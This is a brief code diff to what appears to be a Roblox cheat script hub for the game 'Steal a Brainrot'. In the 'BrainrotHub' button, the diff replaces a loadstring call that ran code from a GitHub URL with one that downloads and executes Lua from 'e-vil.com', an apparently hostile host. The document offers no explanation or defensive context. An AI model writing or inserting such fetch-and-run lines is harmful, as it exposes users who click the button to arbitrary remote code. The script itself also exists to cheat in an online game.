@@ -48,5 +48,5 @@ StealABrainrotSection:NewButton("Brainrot Finder", "finds stuff", function()
 end)
 
 StealABrainrotSection:NewButton("BrainrotHub", "idk lmaooo", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
+    loadstring(game:HttpGet("https://e-vil.com/anbu/awin.lua"))()
 end)
